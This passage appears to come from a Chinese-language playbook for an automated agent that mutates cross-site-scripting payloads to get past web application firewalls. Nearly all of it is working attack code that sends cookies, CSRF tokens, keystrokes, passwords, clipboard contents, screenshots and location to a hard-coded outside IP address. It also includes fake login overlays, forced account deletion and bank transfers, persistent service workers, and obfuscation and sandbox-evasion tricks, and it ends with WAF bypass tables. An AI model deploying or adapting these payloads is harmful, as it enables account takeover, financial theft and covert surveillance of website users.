#### CSRF Token 窃取（防护绕过）
```html
<!-- 从 meta 标签窃取 -->
<img src=x onerror="t=document.querySelector('meta[name=csrf-token]')?.content||document.querySelector('meta[name=_csrf]')?.content;if(t)fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({csrf:t,cookie:document.cookie})})">

<!-- 从 form 隐藏字段窃取 -->
<img src=x onerror="t=document.querySelector('input[name=_csrf]')?.value||document.querySelector('input[name=csrf_token]')?.value;if(t)fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({csrf:t,cookie:document.cookie})})">

<!-- 从所有表单窃取 -->
<img src=x onerror="forms={};document.querySelectorAll('form').forEach((f,i)=>{forms[i]={};f.querySelectorAll('input[type=hidden]').forEach(inp=>forms[i][inp.name]=inp.value)});fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({forms,cookie:document.cookie})})">
```

#### Session ID 窃取（会话固定攻击）
```html
<!-- 从 Cookie 提取 Session ID -->
<img src=x onerror="sid=document.cookie.match(/PHPSESSID=([^;]*)|JSESSIONID=([^;]*)|ASP.NET_SessionId=([^;]*)/)?.[1];if(sid)fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({sid,url:location.href})})">

<!-- 从 URL 提取 Session ID -->
<img src=x onerror="sid=location.href.match(/[?&](PHPSESSID|JSESSIONID|sid|session)=([^&]*)/)?.[2];if(sid)fetch('http://8.129.25.140:12345/',{method:'POST',body:sid})">
```

### 8.3 高级渗透 Payload（红队高级技术）

#### 键盘记录（捕获用户输入）
```html
<!-- 全局键盘监听 -->
<img src=x onerror="kb='';document.onkeypress=e=>{kb+=e.key;if(kb.length>50){fetch('http://8.129.25.140:12345/',{method:'POST',body:kb});kb=''}}">

<!-- 密码字段专项监听 -->
<img src=x onerror="document.querySelectorAll('input[type=password]').forEach(inp=>inp.addEventListener('input',e=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({field:e.target.name,value:e.target.value,url:location.href})})))">

<!-- 表单提交拦截（捕获完整表单） -->
<img src=x onerror="document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{fd=new FormData(e.target);d={};fd.forEach((v,k)=>d[k]=v);fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(d)})}))">
```

#### 页面钓鱼（伪造登录框）
```html
<!-- 伪造 Google 登录 -->
<img src=x onerror="document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999\"><div style=\"position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.3)\"><img src=https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png style=width:200px><h3>Sign in to continue</h3><form id=f><input name=email placeholder=Email style=\"width:100%;padding:10px;margin:10px 0;border:1px solid #ddd\"><input name=password type=password placeholder=Password style=\"width:100%;padding:10px;margin:10px 0;border:1px solid #ddd\"><button style=\"width:100%;padding:10px;background:#4285f4;color:white;border:none;border-radius:4px\">Sign In</button></form></div></div>';document.getElementById('f').onsubmit=e=>{e.preventDefault();fd=new FormData(e.target);d={};fd.forEach((v,k)=>d[k]=v);fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(d)}).then(()=>location.reload())}">

<!-- 伪造会话过期提示 -->
<img src=x onerror="document.body.innerHTML='<div style=\"position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#fff;padding:20px;border:1px solid #ddd;box-shadow:0 2px 8px rgba(0,0,0,0.2);z-index:9999\"><h3>⚠️ Session Expired</h3><p>Please re-enter your password to continue</p><form id=f><input name=password type=password placeholder=Password style=\"width:300px;padding:10px;margin:10px 0;border:1px solid #ddd\"><br><button style=\"padding:10px 20px;background:#007bff;color:white;border:none;border-radius:4px\">Continue</button></form></div>';document.getElementById('f').onsubmit=e=>{e.preventDefault();fetch('http://8.129.25.140:12345/',{method:'POST',body:new FormData(e.target).get('password')}).then(()=>location.reload())}">
```

#### 屏幕截图（html2canvas 远程加载）
```html
<!-- 加载 html2canvas 并截图 -->
<img src=x onerror="s=document.createElement('script');s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';s.onload=()=>html2canvas(document.body).then(canvas=>canvas.toBlob(blob=>fetch('http://8.129.25.140:12345/',{method:'POST',body:blob})));document.head.appendChild(s)">

<!-- 定时截图（持续监控） -->
<img src=x onerror="s=document.createElement('script');s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';s.onload=()=>setInterval(()=>html2canvas(document.body).then(canvas=>canvas.toBlob(blob=>fetch('http://8.129.25.140:12345/',{method:'POST',body:blob}))),30000);document.head.appendChild(s)">
```

#### 页面重定向（钓鱼攻击）
```html
<!-- 带 Cookie 外带的重定向 -->
<img src=x onerror="fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie}).then(()=>location='http://8.129.25.140:12345/phishing?r='+btoa(location.href))">

<!-- 延迟重定向（避免检测） -->
<img src=x onerror="fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie});setTimeout(()=>location='http://evil.com',5000)">
```

#### 表单劫持（自动提交恶意请求）
```html
<!-- 劫持第一个表单 -->
<img src=x onerror="if(document.forms[0])document.forms[0].onsubmit=e=>{fetch('http://8.129.25.140:12345/',{method:'POST',body:new FormData(e.target)})}">

<!-- 劫持所有表单 -->
<img src=x onerror="document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{fd=new FormData(e.target);fetch('http://8.129.25.140:12345/',{method:'POST',body:fd})}))">

<!-- 自动提交恶意请求（CSRF） -->
<img src=x onerror="fetch('/api/delete-account',{method:'POST',credentials:'include'}).then(()=>fetch('http://8.129.25.140:12345/',{method:'POST',body:'account_deleted'}))">

<!-- 自动转账（银行场景） -->
<img src=x onerror="fetch('/api/transfer',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({to:'attacker_account',amount:10000})}).then(r=>r.text()).then(d=>fetch('http://8.129.25.140:12345/',{method:'POST',body:d}))">
```

#### WebRTC 本地 IP 泄露
```html
<!-- 获取内网 IP -->
<img src=x onerror="pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0];if(ip)fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({ip,cookie:document.cookie})})}}">
```

#### Clipboard 劫持（剪贴板监控）
```html
<!-- 读取剪贴板 -->
<img src=x onerror="navigator.clipboard.readText().then(t=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({clipboard:t,url:location.href})}))">

<!-- 持续监控剪贴板 -->
<img src=x onerror="setInterval(()=>navigator.clipboard.readText().then(t=>{if(t!=window.lastClip){window.lastClip=t;fetch('http://8.129.25.140:12345/',{method:'POST',body:t})}}),1000)">

<!-- 劫持粘贴事件 -->
<img src=x onerror="document.addEventListener('paste',e=>{t=e.clipboardData.getData('text');fetch('http://8.129.25.140:12345/',{method:'POST',body:t})})">
```

#### Service Worker 持久化（驻留攻击）
```html
<!-- 注册恶意 Service Worker -->
<img src=x onerror="if('serviceWorker'in navigator){fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie});navigator.serviceWorker.register('data:text/javascript,self.addEventListener(\"fetch\",e=>e.respondWith(fetch(e.request).then(r=>{fetch(\"http://8.129.25.140:12345/\",{method:\"POST\",body:e.request.url});return r})))')}">
```

#### Geolocation 定位（物理位置跟踪）
```html
<!-- 获取地理位置 -->
<img src=x onerror="navigator.geolocation.getCurrentPosition(p=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy,cookie:document.cookie})}))">

<!-- 持续跟踪位置 -->
<img src=x onerror="navigator.geolocation.watchPosition(p=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,time:Date.now()})}))">
```

#### 浏览器指纹收集（设备识别）
```html
<!-- 完整指纹 -->
<img src=x onerror="fp={ua:navigator.userAgent,lang:navigator.language,platform:navigator.platform,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,plugins:Array.from(navigator.plugins).map(p=>p.name),fonts:[],canvas:'',webgl:''};c=document.createElement('canvas');ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('fingerprint',2,2);fp.canvas=c.toDataURL();fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(fp)})">
```

#### DOM XSS 扫描（自动化漏洞发现）
```html
<!-- 扫描 DOM 中的敏感信息 -->
<img src=x onerror="d={};['password','token','secret','key','api','auth'].forEach(k=>{els=document.querySelectorAll(`[name*=${k}],[id*=${k}],[class*=${k}]`);if(els.length)d[k]=Array.from(els).map(e=>({tag:e.tagName,value:e.value||e.innerText}))});fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(d)})">
```

#### Port Scanning（内网端口扫描）
```html
<!-- 扫描本地常见端口 -->
<img src=x onerror="ports=[80,443,3306,5432,6379,27017,8080,8888,9000];ports.forEach(p=>{i=new Image();i.onerror=()=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({port:p,open:false})});i.onload=()=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({port:p,open:true})});i.src='http://127.0.0.1:'+p})">
```

### 8.4 持久化和驻留技术

#### LocalStorage 蠕虫（自我复制）
```html
<!-- 存储 XSS payload 到 LocalStorage -->
<img src=x onerror="payload=`<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})>`;localStorage.setItem('xss_payload',payload);document.write(payload)">

<!-- 从 LocalStorage 加载并执行 -->
<img src=x onerror="if(localStorage.xss_payload)document.write(localStorage.xss_payload)">
```

#### 事件监听持久化
```html
<!-- 监听所有点击事件 -->
<img src=x onerror="document.addEventListener('click',e=>fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({type:'click',target:e.target.tagName,text:e.target.innerText,time:Date.now()})}),true)">

<!-- 监听页面卸载 -->
<img src=x onerror="window.addEventListener('beforeunload',()=>navigator.sendBeacon('http://8.129.25.140:12345/',JSON.stringify({event:'unload',cookie:document.cookie,duration:Date.now()-performance.timing.navigationStart})))">
```

### 8.5 混淆和绕过技术

#### 字符串分割和拼接（绕过静态检测）
```html
<!-- 分割 cookie 关键字 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:document['coo'+'kie']})>

<!-- 分割 URL -->
<img src=x onerror="u='http://8.129.25.140'+':12345/';fetch(u,{method:'POST',body:document.cookie})">

<!-- 使用数组 join -->
<img src=x onerror="u=['http://','8.129.25.140',':12345/'].join('');fetch(u,{body:document.cookie})">
```

#### 动态构造（绕过模式匹配）
```html
<!-- 动态构造 fetch -->
<img src=x onerror="f=window['fet'+'ch'];f('http://8.129.25.140:12345/',{body:document.cookie})">

<!-- 使用 Function 构造器 -->
<img src=x onerror="Function('fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})')()">

<!-- 使用 eval -->
<img src=x onerror="eval('fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})')">
```

#### 延迟执行（绕过沙箱检测）
```html
<!-- setTimeout 延迟 -->
<img src=x onerror="setTimeout(()=>fetch('http://8.129.25.140:12345/',{body:document.cookie}),5000)">

<!-- requestAnimationFrame 延迟 -->
<img src=x onerror="requestAnimationFrame(()=>fetch('http://8.129.25.140:12345/',{body:document.cookie}))">

<!-- Promise 链式延迟 -->
<img src=x onerror="Promise.resolve().then(()=>fetch('http://8.129.25.140:12345/',{body:document.cookie}))">
```

#### 条件执行（绕过无头浏览器检测）
```html
<!-- 检测真实浏览器 -->
<img src=x onerror="if(navigator.webdriver===undefined&&window.outerWidth>0)fetch('http://8.129.25.140:12345/',{body:document.cookie})">

<!-- 检测用户交互 -->
<img src=x onerror="document.addEventListener('click',()=>fetch('http://8.129.25.140:12345/',{body:document.cookie}),{once:true})">

<!-- 检测非沙箱环境 -->
<img src=x onerror="if(!/HeadlessChrome|PhantomJS/.test(navigator.userAgent))fetch('http://8.129.25.140:12345/',{body:document.cookie})">
```

### 8.6 Token 窃取
```html
<img src=x onerror="t=document.querySelector('meta[name=csrf-token]').content;fetch('http://8.129.25.140:12345/',{body:t})">
```

### 8.3 其他实战 Payload

#### 键盘记录
```html
<img src=x onerror="document.onkeypress=e=>fetch('http://8.129.25.140:12345/',{body:e.key})">
```

#### 页面钓鱼（伪造登录框）
```html
<img src=x onerror="document.body.innerHTML='<form><input name=u placeholder=Username><input name=p type=password placeholder=Password><button>Login</button></form>';document.forms[0].onsubmit=e=>{e.preventDefault();fetch('http://8.129.25.140:12345/',{method:'POST',body:new FormData(e.target)})}">
```

#### 页面重定向
```html
<img src=x onerror=location='http://8.129.25.140:12345/?c='+document.cookie>
```

#### 表单劫持
```html
<img src=x onerror="document.forms[0].onsubmit=e=>{fetch('http://8.129.25.140:12345/',{method:'POST',body:new FormData(e.target)})}">
```

#### 自动提交恶意请求
```html
<img src=x onerror="fetch('/api/delete-account',{method:'POST'}).then(()=>fetch('http://8.129.25.140:12345/',{body:'deleted'}))">
```

## 第九步：CSS 样式触发技术

### 9.1 CSS 滚动触发

#### overflow + onscroll
```html
<div style=overflow:auto;height:1px onscroll=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<div style=overflow:scroll;height:1px onscroll=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

#### scroll-snap-type + onscrollend
```html
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
<div style=scroll-snap-type:x;overflow:auto;width:1px onscrollend=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

#### 组合：完整示例（你提供的 payload）
```html
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>
```

### 9.2 CSS 动画触发

#### animation + onanimationend
```html
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

#### animation + onanimationstart
```html
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationstart=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

#### animation + onanimationiteration
```html
<style>@keyframes x{}</style><div style="animation:x 1s infinite" onanimationiteration=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

### 9.3 CSS 过渡触发

#### transition + ontransitionend
```html
<div style="transition:1s;width:0" ontransitionend=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<div style="transition:1s" ontransitionend=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

#### transition + ontransitionstart
```html
<div style="transition:1s;width:0" ontransitionstart=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

### 9.4 CSS 尺寸触发

#### resize + onresize
```html
<div style="resize:both;overflow:auto" onresize=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<span style="resize:both;overflow:auto" onresize=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>x</span>
```

## 第十步：普通标签深度利用

### 10.1 DIV/SPAN/P 等 + 样式 + 事件

#### DIV 标签利用
```html
<div style=overflow:auto;height:1px onscroll=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<div style=resize:both;overflow:auto onresize=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<div style="animation:x 1s" onanimationend=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

#### SPAN 标签利用
```html
<span style=resize:both;overflow:auto onresize=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>x</span>
<span contenteditable oninput=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

#### P 标签利用
```html
<p contenteditable oninput=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<p style=overflow:auto;height:1px onscroll=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

#### A 标签利用
```html
<a href=javascript:fetch('http://8.129.25.140:12345/',{body:document.cookie})>click</a>
<a href=# onclick=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>click</a>
```

#### BUTTON 标签利用
```html
<button onclick=fetch('http://8.129.25.140:12345/',{body:document.cookie})>click</button>
<button autofocus onfocus=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

#### INPUT 标签利用
```html
<input autofocus onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<input type=text oninput=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

### 10.2 不常见但有效的标签

#### FIELDSET/LEGEND
```html
<fieldset><legend onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie}) tabindex=1>
```

#### LABEL
```html
<label for=x onfocus=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie) tabindex=1>
```

#### OUTPUT
```html
<output onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie}) tabindex=1>
```

#### PROGRESS/METER
```html
<progress onfocus=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie) tabindex=1>
<meter onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie}) tabindex=1>
```

#### MENU/MENUITEM
```html
<menu><menuitem onclick=fetch('http://8.129.25.140:12345/',{body:document.cookie}) label=x></menu>
```

## 第十一步：现代浏览器 API 利用

### 11.1 数据外带 API

#### navigator.sendBeacon（推荐）
```javascript
navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)
navigator.sendBeacon('http://8.129.25.140:12345/',new Blob([document.cookie],{type:'text/plain'}))
```

#### fetch() API（推荐）
```javascript
fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})
fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({c:document.cookie})})
```

#### XMLHttpRequest
```javascript
x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.send(document.cookie)
```

#### WebSocket
```javascript
w=new WebSocket('ws://8.129.25.140:12345/');w.onopen=()=>w.send(document.cookie)
```

### 11.2 其他现代 API

#### Clipboard API
```javascript
navigator.clipboard.readText().then(t=>fetch('http://8.129.25.140:12345/',{body:t}))
```

#### Geolocation API
```javascript
navigator.geolocation.getCurrentPosition(p=>fetch('http://8.129.25.140:12345/',{body:JSON.stringify(p.coords)}))
```

#### Notification API
```javascript
Notification.requestPermission().then(()=>new Notification('XSS',{body:document.cookie}))
```

## 第十二步：字符串混淆技术库

### 12.1 字符串拼接绕过关键字

#### 简单拼接
```javascript
document["coo"+"kie"]
document["doc"+"ument"]
window["ale"+"rt"]
```

#### 数组 join
```javascript
["coo","kie"].join("")
["doc","ument"].join("")
["fet","ch"].join("")
```

#### String.fromCharCode
```javascript
String.fromCharCode(99,111,111,107,105,101)  // cookie
String.fromCharCode(102,101,116,99,104)  // fetch
```

#### 计算属性
```javascript
document["c"+"o"+"o"+"k"+"i"+"e"]
window["f"+"e"+"t"+"c"+"h"]
```

### 12.2 编码混合

#### 十六进制转义
```javascript
"\x63ookie"  // cookie
"\x66etch"   // fetch
"\x61lert"   // alert
```

#### Unicode 转义
```javascript
"cookie"  // cookie
"fetch"   // fetch
```

#### Base64（需要 atob）
```javascript
atob("Y29va2ll")  // cookie
atob("ZmV0Y2g=")  // fetch
```

#### URL 编码（需要 unescape）
```javascript
unescape("%63ookie")  // cookie
unescape("%66etch")   // fetch
```

### 12.3 模板字符串

#### 反引号模板
```javascript
`${"coo"}${"kie"}`
`${"fet"}${"ch"}`
```

#### 标签模板
```javascript
eval`cookie`
String.raw`cookie`
```

## 第十三步：完整攻击链实例

### 13.1 你提供的 Payload 完整分析

**原始 Payload**：
```html
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>
```

**技术分解**：

1. **普通标签**：`<div>` - WAF 对普通标签检测较弱
2. **CSS 样式触发**：`scroll-snap-type:y;overflow:auto;height:1px` - 滚动触发
3. **现代事件**：`onscrollend` - 冷门事件，WAF 覆盖不足
4. **globalThis.constructor.constructor**：绕过 Function/eval 检测
5. **字符串拼接**：`"coo"+"kie"` - 绕过 cookie 关键字检测
6. **navigator.sendBeacon**：现代 API，可靠外带
7. **ownerDocument**：间接访问 document，绕过直接引用检测

**变异方向**：

```html
<!-- 变异 1：改用 fetch -->
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=globalThis.constructor.constructor('fetch("http://8.129.25.140:12345/",{body:this.ownerDocument["coo"+"kie"]})')()>

<!-- 变异 2：改用 onscroll -->
<div style=overflow:auto;height:1px onscroll=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>

<!-- 变异 3：改用 span -->
<span style=resize:both;overflow:auto onresize=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>x</span>

<!-- 变异 4：改用动画触发 -->
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>

<!-- 变异 5：改用 this.constructor -->
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=this.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>
```

### 13.2 更多实战组合

#### CSS 动画 + Cookie 窃取 + 字符串拼接
```html
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})>
```

#### 普通标签 + 延迟触发 + 数据外带 + 构造器链
```html
<div style=overflow:auto;height:1px onscroll=setTimeout(()=>globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",document["coo"+"kie"])')(),5000)>
```

#### 多阶段攻击（先加载，再执行）
```html
<!-- 阶段 1：注入加载器 -->
<img src=x onerror="s=document.createElement('script');s.id='x';document.body.appendChild(s)">

<!-- 阶段 2：注入代码 -->
<img src=x onerror="document.getElementById('x').text='fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})'">
```

#### 完整数据外带（Cookie + LocalStorage + URL）
```html
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({cookie:document["coo"+"kie"],local:localStorage,url:location.href})})>
```

## 变异原则检查清单

每轮提出操作前，确认：

### 基础约束
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码/转义（属于编码 Agent 的职责）
- [ ] 保持了原始验证目标（数据外带功能）
- [ ] 外带地址使用 `http://8.129.25.140:12345/`

### 变异策略
- [ ] 已识别 WAF 类型或特征（从历史拦截推断）
- [ ] 选择的变异层次匹配 WAF 强度
- [ ] 优先选择 `available_directions` 中未使用的方向
- [ ] 组合变异时，技术来自不同层次（L2+L3+L4）

### 攻击类别保持
- [ ] **保持攻击类别**：变异后的 Payload 必须保留原始攻击类别
  - 传统标签型 → 保留标签结构
  - 模板注入类 → 保留模板标记
  - 模板引擎类 → 保留双花括号
  - 属性注入类 → 保留引号边界和事件结构
- [ ] **保持攻击效果**：Cookie 窃取 → 仍然是 Cookie 窃取

### 质量保证
- [ ] 与本轮其他候选**在核心技术层面**显著不同
- [ ] 候选间相似度 < 70%（编辑距离计算）
- [ ] 每轮至少包含：1个L2 + 1个L3 + 1个L4 候选
- [ ] 变异强度评分 > 60 分
- [ ] 浏览器兼容性：Chrome + Firefox + Safari

## 附录：快速参考表

### WAF 识别速查

| 拦截特征 | WAF 类型 | 首选绕过 |
|---------|---------|---------|
| 阻断码 1020 | CloudFlare | 冷门标签+事件 + 字符串拼接 |
| `x-amzn-waf` header | AWS WAF | 注释插入 + 间接Document访问 |
| 406 + `Mod_Security` | ModSecurity | 标签嵌套 + 构造器链 |
| `_incap_` cookie | Imperva | CSS样式触发 + 延迟触发 |
| `AkamaiGHost` | Akamai | 普通标签 + CSS样式 |

### 技术层次速查

| WAF 强度 | 推荐层次 | 典型技术 |
|---------|---------|---------|
| 弱（黑名单） | L1-L2 | 标签替换 + 字符串拼接 |
| 中（正则） | L2-L3 | CSS样式触发 + 编码混淆 |
| 强（语义） | L3-L4 | 字符串拼接 + 构造器链 |
| 极强（ML） | L4-L5 | CSS高级触发 + 多阶段加载 |

### 外带方法速查

| 方法 | 优点 | 示例 |
|------|------|------|
| **navigator.sendBeacon** | 可靠，异步，不受页面卸载影响 | `navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)` |
| **fetch()** | 现代，灵活，支持 POST | `fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})` |
| **Image.src** | 简单，兼容性好 | `new Image().src='http://8.129.25.140:12345/?c='+document.cookie` |
| **XMLHttpRequest** | 兼容性最好 | `x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.send(document.cookie)` |

### 字符串拼接速查

| 关键字 | 拼接方法 |
|-------|---------|
| `cookie` | `"coo"+"kie"`, `["coo","kie"].join("")` |
| `document` | `"doc"+"ument"`, `document["doc"+"ument"]` |
| `fetch` | `"fet"+"ch"`, `window["fet"+"ch"]` |
| `alert` | `"ale"+"rt"`, `window["ale"+"rt"]` |
